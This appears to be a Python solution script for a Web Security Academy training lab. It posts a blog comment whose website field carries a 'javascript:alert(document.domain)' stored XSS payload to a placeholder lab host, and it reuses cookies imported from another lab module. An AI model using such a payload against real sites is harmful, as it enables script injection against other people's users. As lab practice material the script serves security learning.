from XXE_injection.Solution.lab8 import burp0_cookies
import requests

burp0_url = "https://YOUR_HOST.web-security-academy.net:443/post/comment"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}
burp0_data = {
    "csrf": "YOUR_CSRF", 
    "postId": "7", 
    "comment": "hello_victim_xss", 
    "name": "test", 
    "email": "test@gmail.com", 
    "website": "javascript:alert(document.domain)"
}
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,allow_redirects=True)